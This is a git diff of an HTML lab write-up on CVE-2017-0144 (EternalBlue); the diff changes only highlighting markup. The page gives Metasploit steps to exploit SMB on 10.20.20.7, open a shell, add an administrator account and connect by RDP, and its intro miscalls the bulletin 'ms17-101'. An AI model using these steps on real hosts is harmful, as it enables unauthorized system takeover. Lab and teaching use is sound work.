@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-09-12 Mon 22:21 -->
+<!-- 2022-09-30 Fri 20:56 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>CVE-2017-0144</title>
@@ -15,9 +15,9 @@
 <header>
 <h1 class="title">CVE-2017-0144</h1>
 </header>
-<div id="outline-container-org6680de0" class="outline-2">
-<h2 id="org6680de0">Introduction - Eternal Blue</h2>
-<div class="outline-text-2" id="text-org6680de0">
+<div id="outline-container-org9861b14" class="outline-2">
+<h2 id="org9861b14">Introduction - Eternal Blue</h2>
+<div class="outline-text-2" id="text-org9861b14">
 <p>
 利用 Metasploit 中针对 ms17-101 漏洞的攻击载荷进行攻击获取主机控制权限。“永恒之蓝”的原理主要是扫描所有开放 445 文件共享端口的 Windows 机器。445 端口可以在局域网中轻松访问各种共享文件夹或共享打印机。
 </p>
@@ -28,16 +28,16 @@
 </ul>
 </div>
 
-<div id="outline-container-org6abd0ff" class="outline-3">
-<h3 id="org6abd0ff">步骤</h3>
-<div class="outline-text-3" id="text-org6abd0ff">
+<div id="outline-container-org34f393b" class="outline-3">
+<h3 id="org34f393b">步骤</h3>
+<div class="outline-text-3" id="text-org34f393b">
 <ol class="org-ol">
 <li><p>
 Bash
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">nmap -r 10.20.20.0/28 <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">search target (optional)</span>
-msfconsole
+<pre class="src src-bash"><span style="color: #006DAF;">nmap</span> <span style="color: #D0372D;">-r</span> 10.20.20.0/<span style="color: #D0372D;">28</span> <span style="color: #8D8D84; font-style: italic;"># search target (optional)</span>
+<span style="color: #006DAF;">msfconsole</span>
 </pre>
 </div></li>
 
@@ -45,12 +45,12 @@ msfconsole
 msfconsole
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">search ms17_010
-use auxiliary/scanner/smb/smb_ms17_010
+<pre class="src src-bash"><span style="color: #006DAF;">search</span> ms17_010
+<span style="color: #006DAF;">use</span> auxiliary/scanner/smb/smb_ms17_010
 <span style="color: #006FE0;">set</span> rhosts 10.20.20.7
-use exploit/windows/smb/ms17_010_eternalblue
+<span style="color: #006DAF;">use</span> exploit/windows/smb/ms17_010_eternalblue
 <span style="color: #006FE0;">set</span> rhosts 10.20.20.7
-run <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">exploit</span>
+<span style="color: #006DAF;">run</span> <span style="color: #8D8D84; font-style: italic;"># exploit</span>
 </pre>
 </div></li>
 
@@ -58,8 +58,8 @@ run <span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-sty
 meterpreter
 </p>
 <div class="org-src-container">
-<pre class="src src-bash"><span style="color: #8D8D84;">#</span><span style="color: #8D8D84; font-style: italic;">if it not enter CMD automatically, input the below command in meterpreter</span>
-shell
+<pre class="src src-bash"><span style="color: #8D8D84; font-style: italic;">#if it not enter CMD automatically, input the below command in meterpreter</span>
+<span style="color: #006DAF;">shell</span>
 </pre>
 </div></li>
 
@@ -77,18 +77,18 @@ net localgroup administrators USERNAME /add
 Bash
 </p>
 <div class="org-src-container">
-<pre class="src src-bash">rdesktop 10.20.20.7:3389
-<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">then input the USERNAME and PASSWORD you had created</span>
-<span style="color: #8D8D84;"># </span><span style="color: #8D8D84; font-style: italic;">now you can control the target machine</span>
+<pre class="src src-bash"><span style="color: #006DAF;">rdesktop</span> 10.20.20.7:3389
+<span style="color: #8D8D84; font-style: italic;"># then input the USERNAME and PASSWORD you had created</span>
+<span style="color: #8D8D84; font-style: italic;"># now you can control the target machine</span>
 </pre>
 </div></li>
 </ol>
 </div>
 </div>
 
-<div id="outline-container-org6ccf4aa" class="outline-3">
-<h3 id="org6ccf4aa">Tips</h3>
-<div class="outline-text-3" id="text-org6ccf4aa">
+<div id="outline-container-org5bd6bf7" class="outline-3">
+<h3 id="org5bd6bf7">Tips</h3>
+<div class="outline-text-3" id="text-org5bd6bf7">
 <p>
 The Below OS version may cause Blue Screen and cannot use successfully:
 </p>
@@ -104,9 +104,9 @@ It&rsquo;s likly the 32-bit OS of Windows 7 as the same case, but we can attack 
 </div>
 </div>
 
-<div id="outline-container-orga74deb9" class="outline-3">
-<h3 id="orga74deb9">参考链接</h3>
-<div class="outline-text-3" id="text-orga74deb9">
+<div id="outline-container-org7024046" class="outline-3">
+<h3 id="org7024046">参考链接</h3>
+<div class="outline-text-3" id="text-org7024046">
 <ol class="org-ol">
 <li><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0144">cve.mitre.org</a></li>
 </ol>
